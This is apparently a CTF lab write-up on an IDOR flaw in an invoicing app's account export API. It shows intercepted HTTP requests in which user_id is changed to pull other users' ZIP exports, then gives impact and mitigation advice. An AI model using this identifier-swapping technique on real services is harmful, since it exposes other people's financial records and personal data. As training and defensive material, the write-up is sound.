---
title: "IDOR – Account Export Data Disclosure | Remittance"
date: 2026-05-26 00:00:00 +0530
categories: [A01 - Broken Access Control, IDOR]
tags: [webversepro, idor, broken-access-control, api, account-export, authorization]
author: Shivansh Sharma
image:
  path: /assets/images/posts/remittance-idor-account-export.webp
  alt: IDOR – Account Export Data Disclosure | Remittance
---

## Lab Link

Lab: [Remittance](https://dashboard.webverselabs-pro.com/challenges/remittance)

---

## Overview

InvoiceVault is a SaaS platform that allows freelancers to manage invoices and export account data for portability purposes. The application exposes an account export API that accepts a user identifier supplied by the client.

Rather than deriving the account identifier from the authenticated session, the endpoint trusts a user-controlled parameter and performs no ownership validation.

As a result, any authenticated user can export the data of other users simply by modifying the supplied identifier.

This is a textbook Insecure Direct Object Reference (IDOR) vulnerability caused by missing object-level authorization controls.

---

## Objective

Abuse the account export functionality to retrieve another user's exported data and recover the flag.

---

## Vulnerability Identification

This challenge is primarily an Insecure Direct Object Reference (IDOR).

### Classification Hierarchy

A01 - Broken Access Control
└── Authorization Failure
└── Object-Level Authorization
└── Insecure Direct Object Reference (IDOR)

---

## Reconnaissance

The application allows users to create accounts and manage invoices.

After registration and login, the account settings page contains an export functionality.

```text
https://eb59f33d-4065-remittance-19866.challenges.webverselabs-pro.com/settings
```

Because export features often return sensitive user information, they are excellent candidates for authorization testing.

---

## Exploitation

### Step 1 - Create an Account

Register a new account:

```text
https://eb59f33d-4065-remittance-19866.challenges.webverselabs-pro.com/register
```

After registration, log in and navigate to:

```text
/settings
```

---

### Step 2 - Trigger an Account Export

Use the export functionality from the settings page.

Intercept the request using Burp Suite.

The application sends the following request:

```http
POST /api/account/export HTTP/2
Host: eb59f33d-4065-remittance-19866.challenges.webverselabs-pro.com
Content-Type: application/json

{"user_id":3}
```

The export endpoint relies on a client-supplied identifier.

At this stage, the authenticated account belongs to user ID 3.

---

### Step 3 - Test Object-Level Authorization

Modify the identifier to reference another user.

Original request:

```json
{
  "user_id": 3
}
```

Modified request:

```json
{
  "user_id": 1
}
```

Forward the request to the server.

---

### Step 4 - Confirm IDOR

The server successfully processes the modified request and returns another user's export file.

This confirms that the application does not verify whether the requested account belongs to the authenticated user.

Instead, it blindly trusts the supplied identifier.

---

### Step 5 - Inspect Exported Data

The server responds with a ZIP archive:

```text
invoicevault-export.zip
```

Extract the contents:

```bash
unzip invoicevault-export.zip
```

The archive contains exported account data, including invoice records.

The first exported account contains invoice information but not the challenge flag.

---

### Step 6 - Enumerate Additional User Records

Repeat the export process using another user identifier.

Modified request:

```json
{
  "user_id": 2
}
```

The application again exports data belonging to a different account.

Extract the archive:

```bash
unzip invoicevault-export.zip
```

Review the exported invoice data:

```bash
cat invoices.csv
```

The flag is disclosed within the exported content.

```text
WEBVERSE{.....}
```

---

## Proof of Exploitation

### Original Request

```json
{
  "user_id": 3
}
```

### Modified Request

```json
{
  "user_id": 1
}
```

### Successful Unauthorized Export

```text
invoicevault-export.zip
```

### Extract Archive

```bash
unzip invoicevault-export.zip
```

### Review Exported Data

```bash
cat invoices.csv
```

### Flag

```text
WEBVERSE{.....}
```

---

## Impact

An attacker can:

* Access other users' exported account data.
* Retrieve invoice records.
* Obtain personally identifiable information (PII).
* Enumerate customer accounts.
* Download sensitive business information.
* Access confidential financial records.

In a production invoicing platform, such a vulnerability could expose:

* Customer details
* Billing records
* Tax information
* Payment history
* Business documents

---

## Mitigation

### Never Trust Client-Supplied Ownership Information

Avoid accepting user identifiers that determine resource ownership.

Instead of:

```json
{
  "user_id": 1
}
```

derive ownership from the authenticated session.

Example:

```python
user_id = current_user.id
```

### Implement Object-Level Authorization

Every request should verify:

```text
Does this resource belong to the authenticated user?
```

before processing.

### Use Server-Side Identity Enforcement

Resource ownership should be determined exclusively on the server.

### Perform Authorization Testing

During security reviews, test all endpoints that accept:

```text
id
user_id
account_id
invoice_id
customer_id
document_id
```

for unauthorized access.

### Apply Least Privilege Principles

Users should only access resources they own.

---

## Real-World Insight

IDOR vulnerabilities remain one of the most common access control issues discovered during penetration tests.

Modern applications frequently expose APIs that accept identifiers supplied by the client. When ownership checks are omitted, attackers can simply replace one identifier with another and gain access to unauthorized data.

This type of flaw has affected:

* Banking platforms
* Healthcare portals
* HR systems
* E-commerce applications
* Government services

The Remittance challenge demonstrates a classic object-level authorization failure where a trusted identifier becomes the mechanism for unauthorized data access.

The core lesson is simple:

**Authentication identifies who a user is. Authorization determines what that user is allowed to access. Both must be enforced for every request.**
